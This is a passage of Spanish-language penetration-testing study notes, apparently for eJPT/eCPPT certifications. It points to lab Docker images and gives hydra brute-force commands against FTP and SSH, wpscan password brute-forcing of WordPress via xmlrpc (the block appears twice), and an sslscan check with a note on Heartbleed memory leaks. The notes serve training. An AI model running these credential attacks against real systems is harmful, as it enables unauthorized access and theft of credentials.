## Explotación

 <a name="exftp"></a>
### FTP
 
Dockers de pruebas
```
1. https://github.com/garethflowers/docker-ftp-server
2. https://github.com/metabrainz/docker-anon-ftp
```

Fuerza bruta: ``` hydra -l user -P passwords.txt ftp://172.17.0.2```

 * Con -l le especificamos un usuario, con -L le especificamos un diccionario de usuarios. igual para la contraseña
 
Si aparece la version, se podría mirar algun exploit.
 
<a name="exssh"></a>
 ### SSH
 
Docker de pruebas ```https://hub.docker.com/r/linuxserver/openssh-server ```
Fuerza bruta: ``` hydra -l user -P passwords.txt ssh://172.17.0.2 -s 2222```

 <a name="exssl"></a>
## HTTPS SSL

 Docker de pruebas
 ```https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160```
  
 Ver vulnerabilidades en certificados SSL:
 ```sslscan google.com:443```  
 algunas maquinas son vulnerables a Heartbleed, lo que consigue hacer un dump de la memoria en la que podemos llegar a encontrar claves privadas, nombres de usuario, contraseñas...

<a name="exwp"></a>
 ## Wordpress
 
Credenciales por fuerza bruta abusando de xmlrpc
 ```
 wpscan --url <ip> -U <usuario encontrado> -P /ruta/al/rockyou.txt
 ```
 
Credenciales por fuerza bruta abusando de xmlrpc
 ```
 wpscan --url <ip> -U <usuario encontrado> -P /ruta/al/rockyou.txt
 ```
<a href="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/tree/main"> Menú Principal</a>
